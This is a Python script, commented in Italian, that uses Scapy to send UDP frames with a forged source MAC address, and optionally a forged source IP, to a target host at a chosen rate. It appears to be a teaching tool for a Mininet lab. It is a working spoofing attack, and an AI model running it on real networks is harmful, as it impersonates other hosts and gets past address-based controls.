#!/usr/bin/env python3
"""Attacco di MAC spoofing con Scapy: frame con header contraffatti (richiede scapy e root).

A differenza di `ip link set <if> address <MAC>` (spoof_demo.py --method iplink), qui
l'interfaccia dell'attaccante CONSERVA il proprio MAC: e' il singolo FRAME che dichiara
un MAC rubato. Inoltre il frame e' costruito per intero, quindi non serve nemmeno una
voce ARP per la destinazione.

Uso (dentro un host di Mininet, es. "h2 python3 tools/spoof_scapy.py ..."):
  python3 tools/spoof_scapy.py --iface h2-eth0 --src-mac 00:00:00:00:00:01 \\
      --dst-mac 00:00:00:00:00:03 --src-ip 10.0.0.2 --dst-ip 10.0.0.3 --port 5001 --rate 1M
Con --src-ip 10.0.0.1 si falsifica anche l'IP.
"""
import argparse
import time


def build_frame(src_mac, dst_mac, src_ip, dst_ip, dport, size=1000, sport=40000):
    from scapy.all import IP, UDP, Ether, Raw
    return Ether(src=src_mac, dst=dst_mac) / IP(src=src_ip, dst=dst_ip) / \
        UDP(sport=sport, dport=dport) / Raw(b"x" * size)


def parse_rate(text):
    text = text.strip().lower()
    mult = {"k": 1e3, "m": 1e6}.get(text[-1], 1)
    return float(text[:-1] if text[-1] in "km" else text) * mult


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--iface", required=True)
    ap.add_argument("--src-mac", required=True, help="MAC falsificato (quello della vittima)")
    ap.add_argument("--dst-mac", required=True)
    ap.add_argument("--src-ip", required=True)
    ap.add_argument("--dst-ip", required=True)
    ap.add_argument("--port", type=int, default=5001)
    ap.add_argument("--rate", default="1M", help="bit/s (es. 1M)")
    ap.add_argument("--size", type=int, default=1000, help="byte di payload")
    ap.add_argument("--duration", type=float, default=5)
    args = ap.parse_args()

    from scapy.all import sendp
    frame = build_frame(args.src_mac, args.dst_mac, args.src_ip, args.dst_ip, args.port, args.size)
    pps = parse_rate(args.rate) / (8 * len(frame))
    count = max(1, int(args.duration * pps))
    t0 = time.time()
    sendp(frame, iface=args.iface, inter=1.0 / pps, count=count, verbose=False)
    print("inviati %d frame in %.1f s (MAC sorgente falsificato %s)" % (count, time.time() - t0, args.src_mac))


if __name__ == "__main__":
    main()
